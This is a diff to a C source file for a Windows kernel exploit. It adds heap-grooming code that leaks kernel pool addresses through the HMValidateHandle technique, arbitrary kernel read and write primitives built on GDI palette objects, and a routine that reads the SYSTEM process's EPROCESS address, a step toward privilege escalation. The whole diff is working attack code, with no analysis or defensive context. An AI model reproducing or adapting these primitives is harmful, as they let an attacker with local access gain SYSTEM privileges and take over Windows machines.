@@ -25,7 +25,6 @@ BOOL CreateCmd()
 	return bRet;
 }
 
-
 BOOL CreateClipboard(DWORD dwSize)
 {
 	BOOL bRet = TRUE;
@@ -135,7 +134,7 @@ PVOID GetHMValidateHandle()
 		if (pIsMenu[i] == 0xE8)
 		{
 			dwFuncAddrOffset = *(PDWORD)(pIsMenu + i + 1);
-			pFuncAddr = (PVOID)(dwFuncAddrOffset + (DWORD)pIsMenu + i + 5);
+			pFuncAddr = (PVOID)(dwFuncAddrOffset + (ULONG64)pIsMenu + i + 5 - 0x100000000);
 			break;
 		}
 	}
@@ -224,7 +223,7 @@ HPALETTE CreatePaletteBySize(DWORD dwSize)
 	HPALETTE hPalette = NULL;
 	PLOGPALETTE pLogPalette = NULL;
 
-	DWORD dwNumEntries = (dwSize - 0x90) / 4;
+	DWORD dwNumEntries = (dwSize - 0x88 - POOL_HEADER_SIZE - 0x10) / 4;
 	DWORD dwPalSize = sizeof(LOGPALETTE) + (dwNumEntries - 1) * sizeof(PALETTEENTRY);
 
 	pLogPalette = (PLOGPALETTE)malloc(dwPalSize);
@@ -250,7 +249,7 @@ exit:
 	return hPalette;
 }
 
-ULONG64 AllocateFreeWindow(DWORD dwMNSize)
+ULONG64 AllocateFreeWindow(DWORD dwSize)
 {
 	ULONG64 ulRes = 0;
 	HINSTANCE handle = NULL;
@@ -266,12 +265,75 @@ ULONG64 AllocateFreeWindow(DWORD dwMNSize)
 	WCHAR szMenuName[0x1005] = { 0 };
 	PWCHAR pClassName = L"LEAKWS";
 
-	memset(szMenuName, 0x41, dwMNSize);
+	memset(szMenuName, 0x42, dwSize - sizeof(WCHAR) - POOL_HEADER_SIZE);
 	wc.style = CS_HREDRAW | CS_VREDRAW;
 	wc.hInstance = handle;
 	wc.lpfnWndProc = DefWindowProc;
 	wc.lpszClassName = pClassName;
 	wc.lpszMenuName = szMenuName;
+
+	if (!RegisterClassW(&wc))
+	{
+		ShowError("RegisterClassW", GetLastError());
+		goto exit;
+	}
+
+	HWND hWnd = CreateWindowExW(0, pClassName, NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+	if (!hWnd)
+	{
+		ShowError("CreateWindowExW", GetLastError());
+		goto exit;
+	}
+	
+	lHMValidateHandle HMValidateHandle = (lHMValidateHandle)GetHMValidateHandle();
+	if (!HMValidateHandle) goto exit;
+	
+	PTHRDESKHEAD pTagWndHead = (PTHRDESKHEAD)HMValidateHandle(hWnd, TYPE_WINDOW);
+	ULONG64 ulTagCls = 0, ulClientDelta = 0;
+
+	ulClientDelta = (ULONG64)pTagWndHead->pSelf - (ULONG64)pTagWndHead;
+	ulTagCls = *(PULONG64)((ULONG64)pTagWndHead + 0xA8) - ulClientDelta;
+	ulRes = *(PULONG64)(ulTagCls + 0x98);
+	DestroyWindow(hWnd);
+	UnregisterClassW(pClassName, handle);
+exit:
+	return ulRes;
+}
+
+ULONG64 AllocateFreeWindows(DWORD dwSize)
+{
+	ULONG64 ulPreEntry = 0, ulCurEntry = 0;
+
+	ulPreEntry = AllocateFreeWindow(dwSize);
+	ulCurEntry = AllocateFreeWindow(dwSize);
+	while (ulCurEntry != ulPreEntry)
+	{
+		ulPreEntry = ulCurEntry;
+		ulCurEntry = AllocateFreeWindow(dwSize);
+	} 
+
+	return ulCurEntry;
+}
+
+ULONG64 AllocateWindows(PWCHAR pMenuName, PWCHAR pClassName)
+{
+	ULONG64 ulRes = 0;
+	HINSTANCE handle = NULL;
+
+	handle = GetModuleHandle(NULL);
+	if (!handle)
+	{
+		ShowError("GetModuleHandle", GetLastError());
+		goto exit;
+	}
+
+	WNDCLASSW wc = { 0 };
+	
+	wc.style = CS_HREDRAW | CS_VREDRAW;
+	wc.hInstance = handle;
+	wc.lpfnWndProc = DefWindowProc;
+	wc.lpszClassName = pClassName;
+	wc.lpszMenuName = pMenuName;
 
 	if (!RegisterClassW(&wc))
 	{
@@ -296,25 +358,77 @@ ULONG64 AllocateFreeWindow(DWORD dwMNSize)
 	ulTagCls = *(PULONG64)((ULONG64)pTagWndHead + 0xA8) - ulClientDelta;
 	ulRes = *(PULONG64)(ulTagCls + 0x98);
 
-	DestroyWindow(hWnd);
-	UnregisterClassW(pClassName, handle);
-
 exit:
 	return ulRes;
 }
 
-ULONG64 AllocateFreeWindows(DWORD dwSize)
+BOOL SetPaletteTarget(HPALETTE hManager, DWORD dwStart, DWORD dwEntries, PVOID pTargetAddress)
 {
-	ULONG64 ulPreEntry = 0, ulCurEntry = 0;
+	BOOL bRet = TRUE;
 
-	ulPreEntry = AllocateFreeWindow(dwSize);
-	ulCurEntry = AllocateFreeWindow(dwSize);
-
-	while (ulCurEntry != ulPreEntry)
+	// 设置要读写的内存地址
+	if (!SetPaletteEntries(hManager, dwStart, dwEntries, (PPALETTEENTRY)&pTargetAddress))
 	{
-		ulPreEntry = ulCurEntry;
-		ulCurEntry = AllocateFreeWindow(dwSize);
-	} 
+		bRet = FALSE;
+		ShowError("SetPaletteEntries", GetLastError());
+		goto exit;
+	}
+exit:
+	return bRet;
+}
 
-	return ulCurEntry;
+ULONG64 ReadDataByPalette(HPALETTE hManager, HPALETTE hWorker, DWORD dwStart, DWORD dwEntries, PVOID pTargetAddress)
+{
+	ULONG64 ulData = 0;
+
+	if (!SetPaletteTarget(hManager, dwStart, dwEntries, pTargetAddress))
+	{
+		goto exit;
+	}
+
+	if (!GetPaletteEntries(hWorker, 0, dwEntries, (PPALETTEENTRY)&ulData))
+	{
+		ShowError("GetPaletteEntries", GetLastError());
+		goto exit;
+	}
+
+exit:
+	return ulData;
+}
+
+BOOL WriteDataByPalette(HPALETTE hManager, HPALETTE hWorker, DWORD dwStart, DWORD dwEntries, PVOID pTargetAddress, ULONG64 ulValue)
+{
+	BOOL bRet = TRUE;
+
+	if (!SetPaletteTarget(hManager, dwStart, dwEntries, pTargetAddress))
+	{
+		bRet = FALSE;
+		goto exit;
+	}
+
+	if (!SetPaletteEntries(hWorker, 0, dwEntries, (PPALETTEENTRY)&ulValue))
+	{
+		bRet = FALSE;
+		ShowError("SetPaletteEntries", GetLastError());
+		goto exit;
+	}
+
+exit:
+	return bRet;
+}
+
+ULONG64 GetSystemEprocessByPalette(HPALETTE hManager, HPALETTE hWorker, DWORD dwStart, DWORD dwEntries)
+{
+	ULONG64 ulSystemAddr = GetSystemProcess();
+
+	if (!ulSystemAddr)
+	{
+		goto exit;
+	}
+	ULONG64 ulSystemEprocess = 0;
+
+	ulSystemEprocess = ReadDataByPalette(hManager, hWorker, dwStart, dwEntries, (PVOID)ulSystemAddr);
+
+exit:
+	return ulSystemEprocess;
 }
